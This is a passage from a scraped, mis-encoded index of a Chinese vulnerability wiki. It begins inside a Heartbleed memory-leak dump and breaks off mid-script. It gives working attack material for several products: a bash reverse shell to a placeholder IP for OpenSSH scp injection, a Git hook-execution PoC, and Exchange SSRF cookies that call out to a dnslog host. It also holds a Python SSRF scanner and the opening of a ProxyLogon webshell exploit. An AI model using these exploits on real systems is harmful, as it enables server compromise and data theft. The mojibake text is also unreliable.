- Length: 0 [*] 192.168.51.133:443 - Type: Server Hello Done (14) [*] 192.168.51.133:443 - Sending Heartbeat... [*] 192.168.51.133:443 - Heartbeat response, 65535 bytes [+] 192.168.51.133:443 - Heartbeat response with leak, 65535 bytes [*] 192.168.51.133:443 - Printable info leaked: ......_...DV.\\....G...{.vc..i ..Gv.'....f.....\".!.9.8.........5.............................3.2.....E.D...../...A.......................................w.....#.'.g.@.r.v.........8.........2.....E.D.......Q.......P.=...ServiceInstanceW&V.b...?....|.y..................................................................................................................................... repeated 15479 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................QA......h.......h.........7.RV....7.RV..................................................................................................................................... repeated 4129 times .....................................................................................................................................0......X.......X.........................7.RV..............................RV..=.c.RV.. .7.RV..x.7.RV....7.RV....7.RV..x.7.RV..x.7.RV..h.7.RV....7.RV....7.RV..192.168.51.146 - - [12/Dec/2020:06:47:40 +0000] \"POST /sdk HTTP/1.1\" 404 170 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\".org/book/nse.html)\"..................................................................................................................................... repeated 3184 times .....................................................................................................................................Q ........................7.RV....7.RV..................................................................................................................................... repeated 7539 times .....................................................................................................................................@..........................................................................................................................................................................................................................................................................................................................................@.......................................................................................................................................................................................................$4.RV..................................@....... .......0.8.RV..........`.......0........$4.RV..jfx...&...~.RV..........PA......`....... '..RV..@d4.RV....................2.RV....................2.RV..........................1.................8.RV..........................1...............................................!...............h....... ...............m..U`.W.....O.>c.....E^X4........kr[..:.1...z[..x.W].........f...3h.qS.&K.(A*q*...].tx.b....X........Np....l.F...5....~..Z2.D..$........................................................................................................................................1.......x.......x.......P.2.RV....2.RV..0.......0.......>#NQ[.8.].......&.i2y.x.I....iOk........a....... '..RV..`.2.RV..................0.2.RV....................2.RV......................;P.e.........................U.6.&`.Ks..w>V.. ^..N..z....z...M.+..n/i..C...D......a..2.p.....I5.F......!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I................................................................................................................................................................................................................................................................................ '..RV.. .8.RV..`.2.RV....................8.RV.................................. .2.RV....................2.RV............................................2.RV....................2.RV.......................... .2.RV.. .2.RV..................h.......h.........8.RV....8.RV..................................................................................................................................... repeated 745 times .....................................................................................................................................#8.RV..`.2.RV........!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I ..................................................................................................................................... repeated 277 times .....................................................................................................................................X.......`.2.RV..........................................................P...........RV............................................................................................................................................................................................................................................................................................................................................2.RV..X..................................................................................................................................... repeated 437 times .....................................................................................................................................A.......X.........1.RV..................................................................................................................................................................................................................................................................................................................................X.......X..................................................................................................................................... repeated 429 times .....................................................................................................................................x.......!.......X.......X..................................................................................................................................... repeated 1942 times .....................................................................................................................................@..........V...R.._.i.rzNP.....-..8J.hp..^..k4.G.. f.....(.]..8......:mbG..~.?/..ot...................6...2../..,0..(0...........j..0...*.H........0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0...200809170346Z..210809170346Z0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0..\"0...*.H.............0.........8...;....../t.....^.....P..=....w.*b.a>.8.Q.?.$.c.......{G. ........l..i...D..V....0......B..J..Y.c.wO.....M.Df..R....\".4.u...............P.>.c..|.s(......,..H.1..0.=l`...(2..Sb.......`...c....5J....v..uj.*^i.$6^..a3.s.......v...\\....M.pK.9....t.&...|y...u1.......u..M..%.+..{e....G..~.v.D.6...............=).3{......r/.\"vz..a.U..5-.5.=......l..ud......Nx...n..$h...4.G.~b.LU.Y...37..e....%.w.......K...G...A....~m.h,......qz>}uA.^)..A.&}o@..'...y.]..V..S..JY........Y/.u|....$.n.T._.b\\\\c...o.]....L.h...v*....z..D..?Kq9hJ.kT....?.....=......su....p.S...j.e.....-N}.S...x..Z.....t.;Z...n=.1.......J.1n.l...w. .l.d.W. .........8..`.>O........t...r..~.A$..R...v.8......x.\\o PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSH/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSH/","title":"OpenSSH","keywords":"","body":"OpenSSH OpenSSH å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-15778 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-29 15:51:56 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSH/OpenSSH å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-15778.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSH/OpenSSH å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-15778.html","title":"OpenSSH å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-15778","keywords":"","body":"OpenSSH å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-15778 æ¼æ´æè¿° 2020å¹´6æœˆ9æ—¥ï¼Œç ”ç©¶äººå‘˜Chinmay Pandyaåœ¨Opensshä¸­å‘ç°äº†ä¸€ä¸ªæ¼æ´ï¼Œäº7æœˆ18æ—¥å…¬å¼€ã€‚OpenSSHçš„8.3p1ä¸­çš„scpå…è®¸åœ¨scp.cè¿œç¨‹åŠŸèƒ½ä¸­æ³¨å…¥å‘½ä»¤ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ç›®å‰ç»å¤§å¤šæ•°linuxç³»ç»Ÿå—å½±å“ã€‚æ·±ä¿¡æœå®‰å…¨ç ”ç©¶å›¢é˜Ÿä¾æ®æ¼æ´é‡è¦æ€§å’Œå½±å“åŠ›è¿›è¡Œè¯„ä¼°ï¼Œä½œå‡ºæ¼æ´é€šå‘Šã€‚ æ¼æ´å½±å“ [!NOTE] OpenSSH æ¼æ´å¤ç° [!NOTE] å¯ç”¨äºç›®æ ‡ä¸å…è®¸è¿œç¨‹ç™»å½•ä½†SCPå¼€å¯çš„æƒ…å†µä¸‹è¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ”»å‡»æœºåˆ›å»º peiqi.txt ï¼Œåˆ©ç”¨ scpä¸Šä¼ æ–‡ä»¶ åˆ° /tmp ç›®å½•ä¸‹ æ‰§è¡Œå‘½ä»¤ ping dnslog åå¼¹shell æ›´æ¢å‘½ä»¤å³å¯ /bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Elasticsearch/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Elasticsearch/","title":"Elasticsearch","keywords":"","body":"Elasticsearch Elasticsearch æœªæˆæƒè®¿é—® PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-16 20:24:46 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Elasticsearch/Elasticsearch æœªæˆæƒè®¿é—®.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Elasticsearch/Elasticsearch æœªæˆæƒè®¿é—®.html","title":"Elasticsearch æœªæˆæƒè®¿é—®","keywords":"","body":"Elasticsearch æœªæˆæƒè®¿é—® æ¼æ´æè¿° Elasticsearchæ˜¯ç”¨Javaå¼€å‘çš„ä¼ä¸šçº§æœç´¢å¼•æ“ï¼Œé»˜è®¤ç«¯å£9200ï¼Œå­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´æ—¶ï¼Œå¯è¢«éæ³•æ“ä½œæ•°æ® æ¼æ´å½±å“ [!NOTE] Elasticsearch æ¼æ´å¤ç° è®¿é—®ç›®æ ‡URL : http://xxx.xxx.xxx.xxx:9200/_node http://localhost:9200/_cat/indices http://localhost:9200/_river/_search //æŸ¥çœ‹æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ http://localhost:9200/_nodes //æŸ¥çœ‹èŠ‚ç‚¹æ•°æ® http://localhost:9200/_plugin/head/ //webç®¡ç†ç•Œé¢(headæ’ä»¶) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-16 20:34:09 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Git/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Git/","title":"Git","keywords":"","body":"Git Git for Visual Studioè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ CVE-2021-21300 Git-LFS è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-27955 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-03 14:33:20 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Git/Git for Visual Studioè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ CVE-2021-21300.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Git/Git for Visual Studioè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ CVE-2021-21300.html","title":"Git for Visual Studioè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ CVE-2021-21300","keywords":"","body":"Git for Visual Studioè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ CVE-2021-21300 æ¼æ´æè¿° æ­¤æ¼æ´å½±å“å…·æœ‰ä¸åŒºåˆ†å¤§å°å†™çš„æ–‡ä»¶ç³»ç»Ÿçš„å¹³å°ï¼Œå½“æŸäº›è¿‡æ»¤å™¨è¢«ä½¿ç”¨æ—¶ï¼ˆä¾‹å¦‚Git LFSï¼‰ã€‚Gitå¯èƒ½ä¼šè¢«æ¬ºéª—è¿è¡Œå…‹éš†æœŸé—´çš„è¿œç¨‹ä»£ç ã€‚ æ¼æ´å½±å“ [!NOTE] v2.17.6ï¼Œv2.18.5ï¼Œv2.19.6ï¼Œv2.20.5ï¼Œv2.21.4ï¼Œ v2.22.5ï¼Œv2.23.4ï¼Œv2.24.4ï¼Œv2.25.5ï¼Œv2.26.3ï¼Œv2.27.1ï¼Œv2.28.1ï¼Œv2.29.3ï¼Œ v2.30.2ã€‚ æ¼æ´å¤ç° æš‚æ— å¤ç° å‚è€ƒæ–‡ç« : https://www.openwall.com/lists/oss-security/2021/03/09/3 æ¼æ´åˆ©ç”¨POC #!/bin/sh git init delayed-checkout && ( cd delayed-checkout && echo \"A/post-checkout filter=lfs diff=lfs merge=lfs\" \\ >.gitattributes && mkdir A && printf '#!/bin/sh\\n\\necho PWNED >&2\\n' >A/post-checkout && chmod +x A/post-checkout && >A/a && >A/b && git add -A && rm -rf A && ln -s .git/hooks a && git add a && git commit -m initial ) && git clone delayed-checkout cloned PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-11 23:26:32 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Git/Git-LFS è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-27955.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Git/Git-LFS è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-27955.html","title":"Git-LFS è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-27955","keywords":"","body":"Git-LFS è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-27955 æ¼æ´æè¿° Git LFS æ˜¯ Github å¼€å‘çš„ä¸€ä¸ª Git çš„æ‰©å±•ï¼Œç”¨äºå®ç° Git å¯¹å¤§æ–‡ä»¶çš„æ”¯æŒ ä¸€äº›å—å½±å“çš„äº§å“åŒ…æ‹¬Gitï¼ŒGitHub CLIï¼ŒGitHub Desktopï¼ŒVisual Studioï¼ŒGitKradenï¼ŒSmartGitï¼ŒSourcetreeç­‰ è¯¥æ¼æ´å½±å“ä»…windowså¹³å° æ¼æ´å½±å“ [!NOTE] Git-LFSï¼ˆgit-lfsï¼‰ æ¼æ´å¤ç° è¿è¡Œä¸‹åˆ—çš„å‘½ä»¤ï¼Œå¦‚æœç‰ˆæœ¬åœ¨å½±å“èŒƒå›´åˆ™ä¼šå¼¹å‡ºè®¡ç®—å™¨ git clone https://github.com/r00t4dm/CVE-2020-27955 æ¼æ´POC https://github.com/r00t4dm/CVE-2020-27955 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Microsoft Exchange/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Microsoft Exchange/","title":"Microsoft Exchange","keywords":"","body":"Microsoft Exchange Microsoft Exchange SSRFæ¼æ´ CVE-2021-26885 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-13 14:55:15 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Microsoft Exchange/Microsoft Exchange SSRFæ¼æ´ CVE-2021-26885.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Microsoft Exchange/Microsoft Exchange SSRFæ¼æ´ CVE-2021-26885.html","title":"Microsoft Exchange SSRFæ¼æ´ CVE-2021-26885","keywords":"","body":"Microsoft Exchange SSRFæ¼æ´ CVE-2021-26885 æ¼æ´æè¿° Exchange Server æ˜¯å¾®è½¯å…¬å¸çš„ä¸€å¥—ç”µå­é‚®ä»¶æœåŠ¡ç»„ä»¶ï¼Œæ˜¯ä¸ªæ¶ˆæ¯ä¸åä½œç³»ç»Ÿã€‚2021å¹´03æœˆ3æ—¥ï¼Œå¾®è½¯å®˜æ–¹å‘å¸ƒäº†Microsoft Exchangeå®‰å…¨æ›´æ–°ï¼ŒæŠ«éœ²äº†å¤šä¸ªé«˜å±ä¸¥é‡æ¼æ´ï¼Œå…¶ä¸­ï¼šåœ¨ CVE-2021-26855 Exchange SSRFæ¼æ´ä¸­ï¼Œæ”»å‡»è€…å¯ç›´æ¥æ„é€ æ¶æ„è¯·æ±‚ï¼Œä»¥Exchange serverçš„èº«ä»½å‘èµ·ä»»æ„HTTPè¯·æ±‚ï¼Œæ‰«æå†…ç½‘ï¼Œå¹¶ä¸”å¯è·å–Exchangeç”¨æˆ·ä¿¡æ¯ã€‚è¯¥æ¼æ´åˆ©ç”¨æ— éœ€èº«ä»½è®¤è¯ æ¼æ´å½±å“ [!NOTE] Exchange 2013 Versions Exchange 2016 CU18 Exchange 2016 CU19 Exchange 2019 CU7 Exchange 2019 CU8 FOFA [!NOTE] icon_hash=\"1768726119\" æ¼æ´å¤ç° ä¸ SSRF æœ‰å…³çš„æ–‡ä»¶ /owa/auth/Current/themes/resources/logon.css /owa/auth/Current/themes/resources/... /ecp/default.flt /ecp/main.css /ecp/.js æŸ¥çœ‹è¡¥ä¸ä¸­çš„æ”¹å˜ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å…³ BackEndServer ä½¿ç”¨çš„ç±»å…³äº BEResourceRequestHandler çš„æ”¹å˜ ä¿®å¤ BEResourceRequestHandler ä½¿ç”¨çš„ BakcEndServerç±»çš„è¡¥ä¸ æŸ¥çœ‹è°ƒç”¨BERsourceRequestHandler çš„æ–¹æ³• SelectHandlerForUnauthenticatedRequest æŸ¥æ‰¾ç›¸å…³è·¯å¾„ ProxyMoudle å¯ä»¥ä»ä¸­çœ‹åˆ°éœ€è¦å¸¦æœ‰ EXPåè®®(ä¾‹å¦‚è·¯å¾„ /ecp/), Cookieå‚æ•° X-BEResponse, è¿˜æœ‰ä»¥é™æ€æ‰©å±•åç»“å°¾çš„ URL (ä¾‹å¦‚ x.js, x.cssç­‰) è€Œå…¶ä¸­çš„è¯·æ±‚ä¸º HttpProxy æ¥å®ç°çš„ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†çš„POCä¸­è¯·æ±‚çš„æ–‡ä»¶ä¸º/etc/y.js è¿™æ ·ç±»ä¼¼ä¸å­˜åœ¨çš„æ–‡ä»¶ å‚æ•° X-BEResource è§£æåœ¨ BackEndServer.FromString è·Ÿè¸ª BackEndServerå¯¹è±¡ï¼Œ å…¶ä¸­è¯¥å¯¹è±¡ä½¿ç”¨ ProxyRequestHandler å‘ä¸»æœºå‘é€è¯·æ±‚ è¿™é‡Œè¿›è¡ŒSSRFçš„æ¼æ´å¤ç°ï¼Œé¦–å…ˆè®¿é—® /ecp/PeiQi.js æ–‡ä»¶ å¹¶è®¾ç½®Cookie X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true GET /ecp/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true ç”¨è¿™æ ·çš„æ–¹å¼è¯·æ±‚å¯ä»¥ç¡®å®šæ˜¯å¦å­˜åœ¨ SSRFæ¼æ´ å“åº”åŒ…ä¸º: NegotiateSecurityContext failed with for host 'peiqi_wiki' with status 'TargetUnknown' æ˜¾ç¤ºè¿™æ ·çš„å°±æ˜¯å¯èƒ½å­˜åœ¨äº† åœ¨é€šè¿‡å‘é€ä¸€ä¸ªè¯·æ±‚ç»™ Dnslogç¡®è®¤æ˜¯å¦å­˜åœ¨ SSRFç»™ Dnslogå‘é€äº†ä¸€ä¸ªè¯·æ±‚ GET /owa/auth/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; [!NOTE] Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; å°†å…¶ä¸­çš„ Dnslogæ¢æˆè‡ªå·±çš„ ç¡®å®šæ”¶åˆ°äº†ç”±æœåŠ¡ç«¯å‘é€çš„è¯·æ±‚ï¼Œå­˜åœ¨SSRFæ¼æ´ æ¼æ´åˆ©ç”¨POC import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Microsoft Exchangeå¤šä¸ªç‰ˆæœ¬ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> mail.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxxx.dnslog.cn \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = \"https://\" + target_url + \"/ecp/PeiQi.js\" headers = { 'Cookie': 'X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true' } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 500 and 'NegotiateSecurityContext' in response.text and 'peiqi_wiki' in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨SSRFæ¼æ´ï¼Œ è¾“å…¥Dnslogåœ°å€è¿›ä¸€æ­¥æ£€æµ‹....\\033[0m\".format(target_url)) dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_2(target_url, dnslog) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨SSRFæ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, dnslog): vuln_url = \"https://\" + target_url + \"/owa/auth/PeiQi.js\" headers = { 'Cookie': 'X-AnonResource=true; X-AnonResource-Backend={}/ecp/default.flt?~3; X-BEResource={}/owa/auth/logon.aspx?~3;'.format(dnslog, dnslog) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] è¯·æŸ¥çœ‹ Dnslogï¼š{} å“åº”....\\033[0m\".format(dnslog)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Microsoft Exchange SSRFæ¼æ´ CVE-2021-26885 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Microsoft Exchange/Microsoft Exchange è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2021-27065 26857 26858 27065.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Microsoft Exchange/Microsoft Exchange è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2021-27065 26857 26858 27065.html","title":"Microsoft Exchange è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2021-27065 26857 26858 27065","keywords":"","body":"Microsoft Exchange è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2021-26855/26857/26858/27065 æ¼æ´æè¿° Microsoft Exchange Server æ˜¯ä¸ªæ¶ˆæ¯ä¸åä½œç³»ç»Ÿã€‚Exchange Serverå¯ä»¥è¢«ç”¨æ¥æ„æ¶åº”ç”¨äºä¼ä¸šã€å­¦æ ¡çš„é‚®ä»¶ç³»ç»Ÿæˆ–å…è´¹é‚®ä»¶ç³»ç»Ÿã€‚2021å¹´03æœˆ03æ—¥å¾®è½¯å®˜æ–¹æŠ«éœ²å¤šä¸ªExchangeé«˜å±æ¼æ´ï¼š CVE-2021-26855 ExchangeæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´ã€‚åˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…èƒ½å¤Ÿä»¥Exchange Serverå‘é€HTTPè¯·æ±‚ï¼Œæ‰«æå†…ç½‘ï¼Œè·å–Exchangeç”¨æˆ·ä¿¡æ¯ã€‚ CVE-2021-26857 Exchangeååºåˆ—åŒ–æ¼æ´ã€‚è¯¥æ¼æ´éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œæ¶æ„ä»£ç ã€‚ CVE-2021-26858/CVE-2021-27065 Exchangeä¸­èº«ä»½éªŒè¯åçš„ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡CVE-2021-26855çš„ssrfæ¼æ´è·å–åˆ°çš„Exchange administratorå‡­è¯ï¼Œæ„é€ æ¶æ„è¯·æ±‚ï¼Œåœ¨ç³»ç»Ÿä¸Šå†™å…¥ä»»æ„æ–‡ä»¶ã€‚ æ¼æ´å½±å“ [!NOTE] Exchange 2013 Versions Exchange 2016 CU18 Exchange 2016 CU19 Exchange 2019 CU7 Exchange 2019 CU8 FOFA [!NOTE] icon_hash=\"1768726119\" æ¼æ´å¤ç° 4ç¯‡å…³äºåŸç†çš„å‚è€ƒæ–‡ç«  https://www.praetorian.com/blog/reproducing-proxylogon-exploit/ https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/ https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ [!NOTE] å…¶ä¸­ä¸€æ¬¡æ”»å‡»ä¸­çš„æ—¥å¿— å¯ä»¥çœ‹åˆ°é¦–å…ˆè¯·æ±‚äº† /rpc/ è¿™ä¸ªç›®å½• æ ¹æ®ç½‘ä¸Šå…¬å¸ƒçš„ POCä¸EXPï¼Œå¯ä»¥çœ‹åˆ° NTMLåå•†æ¶ˆæ¯ä¼šè¿”å›æˆ‘ä»¬NTMLè¯¢é—®ä¿¡æ¯ï¼Œ å…¶ä¸­åŒ…å«äº† AV_PAIRç»“æ„ï¼Œå…¶ä¸­åŒ…å«äº† åç«¯æœåŠ¡å™¨åç§°ä¸åŸŸå base64è§£å¯†å…¶ä¸­çš„åŠ å¯†éƒ¨åˆ† åœ¨é€šè¿‡è§£åŒ…çš„æ–¹æ³•è½¬æ¢å…¶ä¸­çš„æ•°æ®å°±å¯ä»¥å¾—åˆ°å®Œæ•´çš„åç«¯æœåŠ¡å™¨åç§°ä¸åŸŸå åé¢çš„å¤§å®¶å°±å‚è€ƒæ–‡ç« å’ŒEXPæ¥ç ”ç©¶åŸç†å§ï¼Œå‡ ç¯‡æ–‡ç« å’ŒEXPå·²ç»å¾ˆå®Œæ•´äº† æ¼æ´åˆ©ç”¨POC [!NOTE] EXPæ ¹æ®æ¨ç‰¹å’ŒGithubå‡ ä¸ªè„šæœ¬æ›´æ”¹ é»˜è®¤æ‰“çš„é‚®ç®±ä¸º administrator@xxx.xxx.cn(å¯ä»¥è‡ªè¡Œæ›´æ”¹) webshellè·¯å¾„å’Œè„šæœ¬æ–‡ä»¶ä¸­æ›´æ”¹ è¿è¡Œçš„å‘½ä»¤æ˜¯ ping Dnslogè¯æ˜æ¼æ´å­˜åœ¨(ä¸€äº›ä¸œè¥¿å°±å¤§å®¶è‡ªå·±çœ‹çœ‹è„šæœ¬æ”¹å§~) #!/usr/bin/python2 # coding: UTF-8 import re import sys import json import string import requests from urllib import urlencode from tld import get_fld from struct import unpack from base64 import b64encode, b64decode from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Microsoft Exchang å¤šä¸ªç‰ˆæœ¬ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python poc.py \\033[0m') print('+ \\033[36mUrl >>> mail.xxx.org \\033[0m') print('+ \\033[36mEmail >>> Administrator@æ ¹åŸŸå (é»˜è®¤) \\033[0m') print('+------------------------------------------') def _unpack_str(byte_string): return byte_string.decode('UTF-8').replace('\\x00', '') def _unpack_int(format, data): return unpack(format, data)[0] def parse_challenge(Negotiate_base64_decode): target_info_field = Negotiate_base64_decode[40:48] target_info_len = _unpack_int('H', target_info_field[0:2]) target_info_offset = _unpack_int('I', target_info_field[4:8]) target_info_bytes = Negotiate_base64_decode[target_info_offset:target_info_offset + target_info_len] domain_name = '' computer_name = '' info_offset = 0 while info_offset %s 